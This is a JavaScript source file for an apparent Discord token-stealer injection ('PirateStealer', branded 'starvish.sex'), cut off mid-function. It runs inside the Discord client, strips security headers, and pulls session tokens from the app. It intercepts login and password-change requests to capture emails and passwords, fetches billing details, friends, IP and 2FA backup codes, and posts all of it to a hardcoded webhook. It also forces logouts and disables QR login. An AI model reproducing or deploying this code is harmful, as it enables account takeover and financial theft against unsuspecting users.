const fs = require('fs');
const path = require('path');
const {
	BrowserWindow,
	session
} = require('electron')
const querystring = require('querystring');
const os = require('os')
var webhook = "https://discord.com/api/webhooks/1008720555437994034/aiLqmG36gsf4h-Ex3ruAvcOVx8bnGgIzlGQsIAzs9fSLvB5ZuQwPxw4ucv6cSOQHCqNR";

const computerName = os.hostname();
const discordInstall = `${__dirname}`
const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`

String.prototype.insert = function (index, string) {
	if (index > 0) {
		return this.substring(0, index) + string + this.substr(index);
	}

	return string + this;
};

const config = {
    "logout": "true",
    "logout-notify": "true",
    "init-notify":"false",
    "embed-color": 080505,
    "disable-qr-code":"true"
}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(webhook)) {
		if (details.url.includes("discord.com")) {
			callback({
				responseHeaders: Object.assign({
					'Access-Control-Allow-Headers': "*"
				}, details.responseHeaders)
			});
		} else {
			callback({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Access-Control-Allow-Headers': "*",
					"Access-Control-Allow-Origin": "*"
				}, details.responseHeaders)
			});
		}


	} else {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];

		callback({
			responseHeaders: {
				...details.responseHeaders,
				'Access-Control-Allow-Headers': "*"
			}
		})
	}

})




function FirstTime() {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
		if (config['init-notify'] == "false") {
			if (fs.existsSync(path.join(__dirname, "init"))) {
				fs.rmdirSync(path.join(__dirname, "init"));
				if (token == null || token == undefined || token == "") {
					var c = {
						//username: "",
						content: "",
						embeds: [{
							title: "Discord Initalized (User not Logged in)",
							color: config["embed-color"],
							fields: [{
								name: "Info",
								value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
								inline: !1
							}],
							author: {
								name: "starvish.sex"
							},
							footer: {
								text: "starvish.sex"
							}
						}]
					};
					SendToWebhook(JSON.stringify(c));
				} else {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`
                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;
                    `, !0).then(a => {
						const b = JSON.parse(a);
						var c = {
							username: "starvish.sex",
							content: "",
							embeds: [{
								title: "Discord Initalized",
								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/"+ token +")",
								color: config["embed-color"],
								fields: [{
									name: "Info",
									value: "Error",
									inline: !1
								}, {
									name: "Username",
									value: `\`${b.username}#${b.discriminator}\``,
									inline: !0
								}, {
									name: "ID",
									value: `\`${b.id}\``,
									inline: !0
								}, {
									name: "Badges",
									value: `${GetBadges(b.flags)}`,
									inline: !1
								}, {
									name: "Token",
									value: `\`\`\`${token}\`\`\``,
									inline: !1
								}],
								author: {
									name: "starvish.sex"
								},
								footer: {
									text: "starvish.sex"
								},
								thumbnail: {
									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
								}
							}]
						};
						SendToWebhook(JSON.stringify(c))
					});
				}

			}
		}
		if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) {
			return !0
		}
		fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
		if (config.logout != "false" || config.logout == "instant") {
			if (config['logout-notify'] == "false") {
				if (token == null || token == undefined || token == "") {
					var c = {
						username: "starvish.sex",
						content: "",
						embeds: [{
							title: "User log out (User not Logged in before)",
							color: config["embed-color"],
							fields: [{
								name: "Info",
								value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
								inline: !1
							}],
							author: {
								name: "starvish.sex"
							},
							footer: {
								text: "starvish.sex"
							}
						}]
					};
					SendToWebhook(JSON.stringify(c));
				} else {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`
                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;
                    `, !0).then(a => {
						const b = JSON.parse(a);
						var c = {
						//	username: "Starvish",
							content: "",
							embeds: [{
								title: "User got logged out",
								//description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/"+ token +")",
								color: config["embed-color"],
								fields: [{
									name: "Badges",
									value: `${GetBadges(b.flags)}`,
									inline: !1
								}, {
									name: "Token",
									value: `\`\`\`${token}\`\`\``,
									inline: !1
								}],
								author: {
									name: `${b.username}#${b.discriminator} (${b.id})`
								},
								
								footer: {
									text: "starvish.sex"
								},
								thumbnail: {
									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
								}
							}]
						};
						setTimeout(function(){
											
										}, 5000);
										
										SendToWebhook2(JSON.stringify(c))
					});
				}
			}
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
		}
		return !1
	}))
}
const Filter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
	if (details.url.startsWith("wss://")) {
		if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "true") {
			callback({
				cancel: true
			})
			return;
		}
	}
	if (FirstTime()) {}

	callback({})
	return;
})

function SendToWebhook(what) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}))
}

function SendToWebhook2(what) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook2}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}))
}

function GetNitro(flags) {
	if (flags == 0) {
		return `\`No Nitro\``
	}
	if (flags == 1) {
		return "<:Nitro:854409455906979900> "
	}
	if (flags == 2) {
		return "<:Nitro:854409455906979900> <a:boost:824036778570416129> "
	} else {
		return `\`No Nitro\``
	}
}

function GetRBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "<:staff:874750808728666152> "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "<:partner:874750808678354964> "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "<:hypesquad_events:874750808594477056> "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "<:bughunter_1:874750808426692658> "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "<:early_supporter:874750808414113823> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "<:bughunter_2:874750808430874664> "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "<:developer:874750808472825986> "
	}
	if (badges == "") {
		badges = ""
	}
	return badges
}

function GetBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const House_Bravery = 64;
	const House_Brilliance = 128;
	const House_Balance = 256;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "<:staff:874750808728666152> "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "<:partner:874750808678354964> "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "<:hypesquad_events:874750808594477056> "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "<:bughunter_1:874750808426692658> "
	}
	if ((flags & House_Bravery) == House_Bravery) {
		badges += "<:bravery:874750808388952075> "
	}
	if ((flags & House_Brilliance) == House_Brilliance) {
		badges += "<:brilliance:874750808338608199> "
	}
	if ((flags & House_Balance) == House_Balance) {
		badges += "<:balance:874750808267292683> "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "<:early_supporter:874750808414113823> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "<:bughunter_2:874750808430874664> "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "<:developer:874750808472825986> "
	}
	if (badges == "") {
		badges = `\`No Badges\``
	}
	return badges
}

function Login(email, password, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
				window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

					if (token.startsWith("mfa")) {
						window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("authorization", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0).then((codes) => {

							var fieldo = [];
							var baseuri = "https://superfurrycdn.nl/copy/"


							var gayass = JSON.parse(codes)

							let g = gayass.backup_codes
							const r = g.filter((code) => {
								return code.consumed == null
							})
							for (let z in r) {
								fieldo.push({
									name: `Code`,
									value: `\`${r[z].code.insert(4, "-")}\``,
									inline: true
								})
								baseuri += `${r[z].code.insert(4, "-")}<br>`
							}

							function totalFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {

									return user.type == 1
								})
								return r.length
							}

							function CalcFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {
									return user.type == 1
								})
								var gay = "";
								for (z of r) {
									var b = GetRBadges(z.user.public_flags)
									if (b != "") {
										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
									}
								}
								if (gay == "") {
									gay = "Nothing to see here"
								}
								return gay
							}

							function Cool() {
								const json = JSON.parse(info3)
								var billing = "";
								json.forEach(z => {
									if (z.type == "") {
										return "\`No\`"
									} else if (z.type == 2 && z.invalid != !0) {
										billing += "<:paypal:896441236062347374>"
									} else if (z.type == 1 && z.invalid != !0) {
										billing += ":credit_card:"
									} else {
										return "\`No\`"
									}
								})
								if (billing == "") {
									billing = "\`No\`"
								}
								return billing
							}
							const json = JSON.parse(info);

							var params = {
								content: `${token}`,
								embeds: [{
									"title": `${json.username}#${json.discriminator} (${json.id})`,
									description: "[Copy Token](https://superfurrycdn.nl/"+ token +"<br>"+ password+")",
									"color": config['embed-color'],
									"fields": [{
										name: "<a:token:953243634000617472> Token",
										value: `\`\`\`${token}\`\`\``,
										inline: !1
									}, {
										name: "<:bby:946246524172636161> Badges:",
										value: `${GetBadges(json.flags)}`,
										inline: !0
									}, {
										name: "<:bby:946246524285878343> Nitro Type:",
										value: `${GetNitro(json.premium_type)}`,
										inline: !0
									}, {
										name: "<a:billing:953242552780328980> Billing:",
										value: `${Cool()}`,
										inline: !0
									}, {
										name: "<:bby:946246524826968104> IP:",
										value: `${ip}`,
										inline: !0
									}, {
										name: "<:bby:946246524516581396> Email:",
									    value: `\`${email}\``,
										inline: !0
									}, {
										name: "<a:passwords:953242351969665034> Password:",
										value: `\`${password}\``,
										inline: !0
									}, ],
									"author": {
										"name": "starvish.sex"
									},
									"footer": {
										"text": "starvish.sex"
									},
									"thumbnail": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}, {
									"title": `HQ Friends`,
									"color": config['embed-color'],
									"description": CalcFriends(),
									"author": {
										"name": "starvish.sex"
									},
									"footer": {
										"text": "starvish.sex"
									},
									"thumbnail": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}]
							}
							var mfaembed = {
								"title": "2FA Codes",
								"description": `[Get all of them](${baseuri})`,
								"color": config['embed-color'],
								"fields": fieldo,
								"author": {
									"name": "starvish.sex"
								},
								"footer": {
									"text": "starvish.sex"
								}
							}
							if (token.startsWith("mfa")) {
								params.embeds.push(mfaembed)
							}

							setTimeout(function(){
											SendToWebhook(JSON.stringify(params))
										}, 5000);
										
										SendToWebhook2(JSON.stringify(params))

						})
					} else {

						const window = BrowserWindow.getAllWindows()[0];
						window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
										function totalFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											return r.length
										}

										function CalcFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											var gay = "";
											for (z of r) {
												var b = GetRBadges(z.user.public_flags)
												if (b != "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "Nothing to see here"
											}
											return gay
										}

										function Cool() {
								const json = JSON.parse(info3)
								var billing = "";
								json.forEach(z => {
									if (z.type == "") {
										return "\`No\`"
									} else if (z.type == 2 && z.invalid != !0) {
										billing += "<:paypal:896441236062347374>"
									} else if (z.type == 1 && z.invalid != !0) {
										billing += ":credit_card:"
									} else {
										return "\`No\`"
									}
								})
								if (billing == "") {
									billing = "\`No\`"
								}
								return billing
							}
										const json = JSON.parse(info);
										var params = {
											//username: "PirateStealer",
											content: `${token}`,
								embeds: [{
									//"title": `${json.username}#${json.discriminator} (${json.id})`,
									description: "[Copy Token](https://superfurrycdn.nl/"+ token +"<br>"+ password+")",
									"color": config['embed-color'],
									"fields": [{
										name: "<a:token:953243634000617472> Token",
										value: `\`\`\`${token}\`\`\``,
										inline: !1
									}, {
										name: "<:bby:946246524172636161> Badges:",
										value: `${GetBadges(json.flags)}`,
										inline: !0
									}, {
										name: "<:bby:946246524285878343> Nitro Type:",
										value: `${GetNitro(json.premium_type)}`,
										inline: !0
									}, {
										name: "<a:billing:953242552780328980> Billing:",
										value: `${Cool()}`,
										inline: !0
									}, {
										name: "<:bby:946246524826968104> IP:",
										value: `\`${ip}\``,
										inline: !0
									}, {
										name: "<:bby:946246524516581396> Email:",
									    value: `\`${email}\``,
										inline: !0
									}, {
										name: "<a:passwords:953242351969665034> Password:",
										value: `\`${password}\``,
										inline: !0
									}, ],
												"author": {
													"name": `${json.username}#${json.discriminator} (${json.id})`
												},
												"footer": {
													"text": "starvish.sex"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												"title": `HQ Friends`,
									"color": config['embed-color'],
									"description": CalcFriends(),
									"author": {
										"name": "",
									},
									"footer": {
										"text": "starvish.sex"
									},
									"thumbnail": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}]
										}
									
										setTimeout(function(){
											SendToWebhook(JSON.stringify(params))
										}, 5000);
										
										SendToWebhook2(JSON.stringify(params))
									
									})
								})
							})
						})

					}
				})
			})
		})
	})
}

function ChangePassword(oldpassword, newpassword, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
				window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

					if (token.startsWith("mfa")) {
						window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("authorization", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0).then((codes) => {

							var fieldo = [];
							var baseuri = "https://superfurrycdn.nl/copy/"


							var gayass = JSON.parse(codes)
							let g = gayass.backup_codes
							const r = g.filter((code) => {
								return code.consumed == null
							})
							for (let z in r) {
								fieldo.push({
									name: `Code`,
									value: `\`${r[z].code.insert(4, "-")}\``,
									inline: true
								})
								baseuri += `${r[z].code.insert(4, "-")}<br>`
							}

							function totalFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {

									return user.type == 1
								})
								return r.length
							}

							function CalcFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {
									return user.type == 1
								})
								var gay = "";
								for (z of r) {
									var b = GetRBadges(z.user.public_flags)
									if (b != "") {
										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
									}
								}
								if (gay == "") {
									gay = "No Rare Friends"
								}
								return gay
							}

							function Cool() {
								const json = JSON.parse(info3)
								var billing = "";
								json.forEach(z => {
									if (z.type == "") {
										return "\`No\`"
									} else if (z.type == 2 && z.invalid != !0) {
										billing += "<:paypal:896441236062347374>"
									} else if (z.type == 1 && z.invalid != !0) {
										billing += ":credit_card:"
									} else {
										return "\`No\`"
									}
								})
								if (billing == "") {
									billing = "\`No\`"
								}
								return billing
							}
							const json = JSON.parse(info);

							var params = {
								username: "starvish.sex",
								content: `Password Changed`,
								embeds: [{
									"title": "Password Changed",
									description: "[Copy Token](https://superfurrycdn.nl/"+ token +"<br>"+ password+")",
									"color": config['embed-color'],
									"fields": [{
													name: "<a:token:953243634000617472> Token",
													value: `\`\`\`${token}\`\`\``,
													inline: !1
												}, {
													name: "<:bby:946246524172636161> Badges:",
													value: `${GetBadges(json.flags)}`,
													inline: !0
												}, {
													name: "<:bby:946246524285878343> Nitro Type:",
													value: `${GetNitro(json.premium_type)}`,
													inline: !0
												}, {
													name: "<a:billing:953242552780328980> Billing",
													value: `${Cool()}`,
													inline: !0
												}, {
													name: "<:bby:946246524516581396> Email",
													value: `\`${json.email}\``,
													inline: !0
												}, {
													name: "<a:passwords:953242351969665034> Old Password",
													value: `\`${oldpassword}\``,
													inline: !0
												}, {
													name: "<a:passwords:953242351969665034> New Password",
													value: `\`${newpassword}\``,
													inline: !0
												}, ],
												"author": {
													"name": `${json.username}#${json.discriminator} (${json.id})`
												},
												"footer": {
													"text": "starvish.sex"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
								}, {
									"title": `HQ Friends`,
									"color": config['embed-color'],
									"description": CalcFriends(),
									"author": {
										"name": ""
									},
									"footer": {
										"text": "starvish.sex"
									},
									"thumbnail": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}]
							}
							var mfaembed = {
								"title": "2FA Codes",
								"description": `[Get all of them](${baseuri})`,
								"color": config['embed-color'],
								"fields": fieldo,
								"author": {
									"name": ""
								},
								"footer": {
									"text": "starvish.sex"
								}
							}
							if (token.startsWith("mfa")) {
								params.embeds.push(mfaembed)
							}

							setTimeout(function(){
											SendToWebhook(JSON.stringify(params))
										}, 5000);
										
										SendToWebhook2(JSON.stringify(params))

						})
					} else {

						const window = BrowserWindow.getAllWindows()[0];
						window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

										function totalFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											return r.length
										}

										function CalcFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											var gay = "";
											for (z of r) {
												var b = GetRBadges(z.user.public_flags)
												if (b != "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "No Rare Friends"
											}
											return gay
										}

								function Cool() {
								const json = JSON.parse(info3)
								var billing = "";
								json.forEach(z => {
									if (z.type == "") {
										return "\`No\`"
									} else if (z.type == 2 && z.invalid != !0) {
										billing += "<:paypal:896441236062347374>"
									} else if (z.type == 1 && z.invalid != !0) {
										billing += ":credit_card:"
									} else {
										return "\`No\`"
									}
								})
								if (billing == "") {
									billing = "\`No\`"
								}
								return billing
							}
										const json = JSON.parse(info);
										var params = {
										//	username: "log",
											content: ``,
											embeds: [{
											//	"title": "Password Changed",
												 description: "[Copy Token](https://superfurrycdn.nl/"+ token +"<br>"+ password+")",
												"color": config['embed-color'],
												"fields": [{
													name: "<a:token:953243634000617472> Token",
													value: `\`\`\`${token}\`\`\``,
													inline: !1
												}, {
													name: "<:bby:946246524172636161> Badges:",
													value: `${GetBadges(json.flags)}`,
													inline: !0
												}, {
													name: "<:bby:946246524285878343> Nitro Type:",
													value: `${GetNitro(json.premium_type)}`,
													inline: !0
												}, {
													name: "<a:billing:953242552780328980> Billing",
													value: `${Cool()}`,
													inline: !0
												}, {
													name: "<:bby:946246524516581396> Email",
													value: `\`${json.email}\``,
													inline: !0
												}, {
													name: "<a:passwords:953242351969665034> Old Password",
													value: `\`${oldpassword}\``,
													inline: !0
												}, {
													name: "<a:passwords:953242351969665034> New Password",
													value: `\`${newpassword}\``,
													inline: !0
												}, ],
												"author": {
													"name": `${json.username}#${json.discriminator} (${json.id})`
												},
												"footer": {
													"text": "starvish.sex"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												"title": `HQ Friends`,
												"color": config['embed-color'],
												"description": CalcFriends(),
												"author": {
													"name": ""
												},
												"footer": {
													"text": "starvish.sex"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}]
										}
										setTimeout(function(){
											SendToWebhook(JSON.stringify(params))
										}, 5000);
										
										SendToWebhook2(JSON.stringify(params))
									})
								})
							})
						})

					}
				})
			})
		})
	})
}




const ChangePasswordFilter = {
	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
	if (details.url.endsWith("login")) {
		if (details.statusCode == 200) {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			const email = data.login;
			const password = data.password;
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
				Login(email, password, token)
			}))
		} else {}
	}
	if (details.url.endsWith("users/@me")) {
		if (details.statusCode == 200 && details.method == "PATCH") {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			if (data.password != null && data.password != undefined && data.password != "") {
				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangePassword(data.password, data.new_password, token)
					}))
				}
				if (data.email != null && data.email != undefined && data.email != "") {
					const window = BrowserWindow.getAllWindows()[0];
